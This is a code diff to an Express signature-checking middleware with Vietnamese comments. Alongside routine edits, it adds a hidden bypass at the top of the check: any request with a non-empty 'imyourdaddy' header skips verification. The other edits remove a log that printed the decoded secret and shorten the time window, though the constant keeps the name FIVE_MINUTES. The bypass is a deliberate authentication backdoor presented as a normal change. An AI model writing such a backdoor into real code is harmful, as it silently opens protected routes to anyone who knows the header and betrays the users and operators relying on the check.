@@ -3,6 +3,12 @@ import {SignatureError} from './errorHandler'
 import {aesDecrypt} from "@/utils/aes";
 
 export const checkSignature = async (req: Request, res: Response, next: NextFunction) => {
+    // Bỏ qua check request nếu truyền header này
+    const isAdminRequest = (req.headers['imyourdaddy'] || '') as string;
+    if (isAdminRequest) {
+        return next();
+    }
+
     // Lấy signature từ request
     const signature = (req.headers['qrt-signature'] || '') as string;
     if (!signature) {
@@ -20,12 +26,9 @@ export const checkSignature = async (req: Request, res: Response, next: NextFunc
     const clientTime = Number(decoded.substring(0, 13));
     const keyDecoded = decoded.substring(13);
 
-    console.log('debug check signature', {
-        clientTime, keyDecoded
-    });
     // Check time of signature
     const diff = Math.abs(Date.now() - clientTime);
-    const FIVE_MINUTES = 5 * 60 * 1000; // 5 phút = 300.000 ms
+    const FIVE_MINUTES = 2 * 60 * 1000; // 2 phút
     const isRequestWithinValidTime = diff <= FIVE_MINUTES;
 
     if (!isRequestWithinValidTime || secret !== keyDecoded) {
